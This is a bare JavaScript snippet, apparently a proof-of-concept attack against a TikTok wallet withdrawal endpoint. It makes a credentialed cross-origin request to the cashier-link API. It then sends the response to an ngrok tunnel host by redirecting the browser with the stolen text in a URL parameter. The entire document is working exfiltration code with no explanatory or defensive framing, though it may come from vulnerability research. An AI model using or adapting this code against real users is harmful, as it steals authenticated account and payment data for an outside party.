var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://webcast.tiktok.com/webcast/wallet_api_tiktok/withdraw/cashier_link/");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(null);

function reqListener() {
    window.location='//2d7a-140-213-103-229.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
};
